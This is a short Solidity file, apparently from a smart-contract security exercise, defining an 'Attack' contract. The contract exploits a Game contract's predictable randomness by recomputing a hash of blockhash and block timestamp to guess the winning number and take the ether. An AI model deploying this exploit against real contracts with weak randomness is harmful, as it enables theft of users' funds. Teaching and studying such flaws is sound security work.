// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./Game.sol";

contract Attack {
    Game game;

    //create an instance of Game contract with the help of `gameAddress`
    constructor(address gameAddress) {
        game = Game(gameAddress);
    }

    //attack the game by guessing the exact number due to 
    //`blockhash` and `blocktimestamp` being publicly accessible
    function attack() public payable {
        uint256 _guess = uint256(
            keccak256(
                abi.encodePacked(blockhash(block.number), block.timestamp))
        );
        game.guess(_guess);
    }

    //gets called when the contract receives ether
    receive() external payable {}
}